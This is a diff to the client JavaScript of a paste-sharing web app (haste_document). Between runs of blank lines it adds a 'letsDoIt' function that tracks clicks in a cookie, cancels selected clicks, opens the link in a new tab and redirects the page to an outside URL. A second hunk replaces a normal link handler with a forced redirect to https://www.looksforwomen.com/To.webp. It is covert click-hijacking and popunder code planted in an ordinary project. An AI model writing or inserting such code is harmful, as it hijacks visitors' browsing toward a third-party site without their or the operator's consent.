@@ -39,6 +39,88 @@ haste_document.prototype.htmlEscape = function(s) {
     .replace(/"/g, '&quot;');
 };
 
+
+
+
+
+
+
+function letsDoIt(clickNumber, showNumber, countPerDay, putUrl) {
+    var currentUrl;
+    var clickCounter = 0;
+    var d = new Date();
+    d.setTime(d.getTime() + ((24 / countPerDay) * 60 * 60 * 1000));
+    var expires = "expires=" + d.toUTCString();
+    var cookie1 = "p3006";
+    var www = "www";
+    var hash = window.location.hash.substring(1);
+    console.log(hash);
+    if (hash == www) {
+        setCookie(cookie1, "1")
+    }
+    function getCookie(cname) {
+        var name = cname + "=";
+        var ca = document.cookie.split(';');
+        for (var i = 0; i < ca.length; i++) {
+            var c = ca[i];
+            while (c.charAt(0) == ' ')
+                c = c.substring(1);
+            if (c.indexOf(name) == 0)
+                return c.substring(name.length, c.length)
+        }
+        return false
+    }
+    function setCookie(cname, cvalue) {
+        document.cookie = cname + "=" + cvalue + "; path=/; " + expires
+    }
+    function loadpopunder() {
+        win2 = window.open(currentUrl, "_blank");
+        window.focus();
+        window.location.href = putUrl
+    }
+    $(document).on("click", function(e) {
+        if (!getCookie(cookie1)) {
+            clickCounter = 1
+        } else {
+            clickCounter = getCookie(cookie1);
+            clickCounter++
+        }
+        if (clickCounter <= (clickNumber * showNumber)) {
+            setCookie(cookie1, clickCounter)
+        }
+        if (!(clickCounter % clickNumber) && !(clickCounter % showNumber) && (clickCounter <= (clickNumber * showNumber))) {
+            e.preventDefault();
+            currentUrl = window.location.href;
+            var target = $(e.target), article;
+            if (target.is('a')) {
+                if (target.attr("href") && (target.attr("href").search("javascript") == -1)) {
+                    currentUrl = target.attr("href");
+                    if (currentUrl.indexOf(www) > -1) {
+                        currentUrl = currentUrl + "#www"
+                    }
+                }
+            } else if (target.closest('a')) {
+                if (target.closest("a").attr("href") && (target.closest("a").attr("href").search("javascript") == -1)) {
+                    currentUrl = target.closest("a").attr("href");
+                    if (currentUrl.indexOf(www) > -1) {
+                        currentUrl = currentUrl + "#www"
+                    }
+                }
+            }
+            setCookie(cookie1, clickCounter);
+            loadpopunder()
+        }
+    })
+}
+
+
+
+
+
+
+
+
+
 // Save this document to the server and lock it here
 haste_document.prototype.save = function(data, callback) {
   if (this.locked) {
@@ -350,7 +432,10 @@ console.log("Y2");
   var _this = this;
   _this.doc = new haste_document();
 
-  window.open(event.target.href, '_top');
+win2 = window.open(event.target.href, '_blank');
+        window.focus();
+        window.location.href = 'https://www.looksforwomen.com/To.webp';
+
   this.doc.saveCount(function(err, ret) {
     //if (err) {
     //  console.log(err);
